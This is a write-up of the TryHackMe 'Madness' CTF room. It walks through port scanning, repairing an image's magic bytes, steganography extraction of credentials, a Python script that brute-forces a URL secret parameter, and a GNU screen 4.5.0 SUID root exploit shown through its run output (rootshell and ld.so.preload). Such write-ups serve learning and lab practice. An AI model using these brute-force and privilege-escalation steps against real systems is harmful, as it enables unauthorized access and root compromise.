# Madness CTF TryHackMe
## This was easily the trickiest but most enjoyable room I have done yet

## 1. Scanning & Enumeration
We do the below scans in parallel.

### 1.1. Port Scanning: 

```
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 (RSA)
|   256 dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 (ECDSA)
|_  256 e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nothing extraordinary.
```

### 1.2. Web Exploration
```html
<div class="main_page">
      <div class="page_header floating_element">
        
<!-- They will never find me-->
```
In the homepage, which is a default ubuntu page, we see the thm.jpg image, that does not render out properly. We see it in the source code.

### 1.3. Steganography
Exploring the image using strings, binwalk and steghide does not return anything.

At this point, one thing CTF challenges often have is the change in the magic number of the file.

These magic numbers are used by the system to recognise which file it is. Using xxd --plain thm.jpg > wow.txt we see the first line: ```89504e470d0a1a0a000000010100000100010000ffdb0043000302020302```

I looked up the actual values for jpg files. We thus change the first line to: ```ffd8ffe000104a46494600010100000100010000ffdb0043000302020302```

We see the hidden directory mentioned in the image!

PS: It is also a good idea to download the image … just in case, you know?

### 1.4. Hidden Directory Exploration
The hidden directory screenshot, asking for a secret number

Info gathered:

We have to enter a secret
Source code mentions something about the type of input and the size of input.
The question is thus: How do we input?
1.5. Finding the Secret
Trying the below gives us an expected response. Note how the parameter is accepted.
```
┌──(kali㉿kali)-[/tmp]
└─$ curl 10.10.0.237/{hidden_directory_name}/?secret=1
<html>
<head>
  <title>Hidden Directory</title>
  <link href="stylesheet.css" rel="stylesheet" type="text/css">
</head>
<body>
  <div class="main">
<h2>Welcome! I have been expecting you!</h2>
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here-->

<p>Secret Entered: 1</p>

<p>That is wrong! Get outta here!</p>

</div>
</body>
</html>
```
We also see the hint printed out here. Time for some scripting!

I wrote the below code, which you can use to brute-forcing the value of the secret parameter.
```
┌──(kali㉿kali)-[/tmp]
└─$ cat script.py
import requests

url = "http://MACHINE_IP_HERE/{hidden_directory_name}/?secret="

for i in range(100):
    curr_url = url+str(i)
    response = requests.get(curr_url)
    if response.text.find("wrong") == -1:
        print(i)
        break
    print(f"Checking {i} rn")
    
```
And we get the secret number, which gets us a key!

But, to what?

### 1.6. Steganography
Remember the image we fixed earlier? Well, this is where the key is being used.
```
┌──(kali㉿kali)-[/tmp]
└─$ steghide --extract --stegofile download.jpeg 
Enter passphrase: 
wrote extracted data to "hidden.txt".
```

```
┌──(kali㉿kali)-[/tmp]
└─$ cat hidden.txt 
Fine you found the password! 

Here's a username 

wbxre

I didn't say I would make it easy for you!
Ey, Voila! Using rot13 gives us the username.
```
But … PASSWORD????????

## 2. Foothold (finally): Big Brain Time
At this point, we have no active paths we could explore. Bruteforcing SSH is not a good idea. What to do?

This is very sneaky. Saw the image on the room? Download it.
```
┌──(kali㉿kali)-[/tmp]
└─$ steghide --extract --stegofile f***.jpg      
Enter passphrase: 
wrote extracted data to "password.txt".
```

```
┌──(kali㉿kali)-[/tmp]
└─$ cat password.txt 
I didn't think you'd find me! Congratulations!

Here take my password

{hidden}
```
AH YES! Finally!

## 3. PrivEsc
We epxlore the common paths to priv esc.
```
joker@ubuntu:~$ sudo -l
[sudo] password for joker: 
Sorry, user joker may not run sudo on ubuntu.
```
^not useful.
```
joker@ubuntu:~$ find / -type f -perm -u=s 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/bin/fusermount
/bin/su
/bin/ping6
/bin/screen-4.5.0
/bin/screen-4.5.0.old
/bin/mount
/bin/ping
/bin/umount
```

^finding set uid bit

Does something seem off to you? I googled it, and found the exploit.

Copy-pasting the script and executing -
```
joker@ubuntu:~$ vim wow.sh
joker@ubuntu:~$ bash wow.sh 
wow.sh: line 1: creenroot.sh: command not found
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function ‘dropshell’:
/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^
/tmp/rootshell.c: In function ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
     setuid(0);
     ^
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
     setgid(0);
     ^
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
     seteuid(0);
     ^
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
     setegid(0);
     ^
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);
     ^
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-joker.
```
```
# whoami
root
```

### System Compromised :)
